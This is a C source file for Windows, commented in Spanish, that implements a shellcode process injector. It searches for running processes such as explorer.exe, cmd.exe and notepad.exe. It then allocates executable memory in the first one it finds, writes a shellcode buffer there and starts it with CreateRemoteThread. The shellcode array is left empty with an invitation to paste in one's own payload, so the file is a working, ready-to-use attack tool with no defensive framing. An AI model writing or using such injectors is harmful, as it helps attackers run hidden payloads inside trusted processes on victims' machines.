#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

// Array de procesos a buscar
const char* target_processes[] = {
    "cmd.exe",
    "explorer.exe",
    "notepad.exe",
    "calc.exe"
};

// Codigo de shellcode
unsigned char shellcode[] = {
//Paste here your shellcode.
//Pega aqui tu shellcode.
};

// Funcion para verificar errores y mostrar mensaje
void check_error(const char* operation) {
    DWORD error = GetLastError();
    if (error != 0) {
        printf("[ERROR] %s fallo con el codigo de error: %lu\n", operation, error);
        
        // Obtener descripcion del error
        LPVOID lpMsgBuf;
        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
            NULL,
            error,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR) &lpMsgBuf,
            0,
            NULL
        );
        printf("[ERROR] Descripcion: %s\n", (char*)lpMsgBuf);
        LocalFree(lpMsgBuf);
    }
}

// Funcion para encontrar proceso por nombre
DWORD find_process_by_name(const char* process_name) {
    HANDLE snapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    
    printf("[INFO] Busqueda de proceso: %s\n", process_name);
    
    // Crear snapshot de todos los procesos
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        check_error("CreateToolhelp32Snapshot");
        return 0;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // Obtener el primer proceso
    if (!Process32First(snapshot, &pe32)) {
        check_error("Process32First");
        CloseHandle(snapshot);
        return 0;
    }
    
    do {
        // Comparar nombres (case insensitive)
        if (_stricmp(pe32.szExeFile, process_name) == 0) {
            pid = pe32.th32ProcessID;
            printf("[SUCCESS] Se ha encontrado el proceso %s con el PID: %lu\n", process_name, pid);
            break;
        }
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    
    if (pid == 0) {
        printf("[WARNING] Proceso %s no encontrado\n", process_name);
    }
    
    return pid;
}


// Funcion para inyectar codigo en un proceso
BOOL inject_code_into_process(DWORD pid) {
    HANDLE hProcess = NULL;
    LPVOID remote_memory = NULL;
    HANDLE hThread = NULL;
    SIZE_T bytes_written = 0;
    BOOL success = FALSE;
    
    printf("[INFO] Inicio de la inyeccion en PID: %lu\n", pid);
    
    // Abrir el proceso con permisos necesarios
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, 
        pid
    );
    
    if (hProcess == NULL) {
        check_error("OpenProcess");
        goto cleanup;
    }
    
    printf("[SUCCESS] Proceso abierto correctamente.\n");
    
    // Asignar memoria en el proceso remoto
    remote_memory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (remote_memory == NULL) {
        check_error("VirtualAllocEx");
        goto cleanup;
    }
    
    printf("[SUCCESS] Memoria asignada en la direccion: 0x%p\n", remote_memory);
    
    // Escribir el shellcode en la memoria remota
    if (!WriteProcessMemory(
        hProcess,
        remote_memory,
        shellcode,
        sizeof(shellcode),
        &bytes_written
    )) {
        check_error("WriteProcessMemory");
        goto cleanup;
    }
    
    printf("[SUCCESS] Se escribio %zu bytes en el proceso remoto.\n", bytes_written);
    
    // Crear un hilo remoto para ejecutar el shellcode
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remote_memory,
        NULL,
        0,
        NULL
    );
    
    if (hThread == NULL) {
        check_error("CreateRemoteThread");
        goto cleanup;
    }
    
    printf("[SUCCESS] Hilo remoto creado correctamente\n");
    
    // Esperar a que termine el hilo (opcional)
    WaitForSingleObject(hThread, 5000); // Esperar máximo 5 segundos
    
    success = TRUE;
    printf("[SUCCESS] La inyeccion de codigo se completo con exito.\n");

cleanup:
    // Limpiar recursos
    if (hThread) {
        CloseHandle(hThread);
    }
    
    if (remote_memory && hProcess) {
        VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
    }
    
    if (hProcess) {
        CloseHandle(hProcess);
    }
    
    return success;
}


int main() {
    // Buscar procesos en el array
    int process_count = sizeof(target_processes) / sizeof(target_processes[0]);
    DWORD found_pids[10];
    int found_count = 0;
    
    printf("[INFO] Buscando procesos...\n");
    
    for (int i = 0; i < process_count; i++) {
        DWORD pid = find_process_by_name(target_processes[i]);
        if (pid != 0) {
            found_pids[found_count] = pid;
            found_count++;
        }
    }
    
    if (found_count == 0) {
        printf("[ERROR] No se encontraron procesos\n");
        goto end;
    }
    
    printf("\n[INFO] Se han encontrado %d procesos objetivo\n", found_count);
    printf("[INFO] Intentando la inyeccion de codigo...\n\n");
    
    // Intentar inyeccion en el primer proceso encontrado
    for (int i = 0; i < found_count; i++) {
        printf("--- Intento de inyecciont %d ---\n", i + 1);
        
        if (inject_code_into_process(found_pids[i])) {
            printf("[SUCCESS] Inyeccion realizada con exito\n");
            break;
        } else {
            printf("[FAILED] Error en la inyeccion para PID: %lu\n", found_pids[i]);
        }
        
        printf("\n");
    }

end:
    printf("\n[INFO] Programa finalizado. Pulse Intro para salir....\n");
    getchar();
    
    return 0;
}
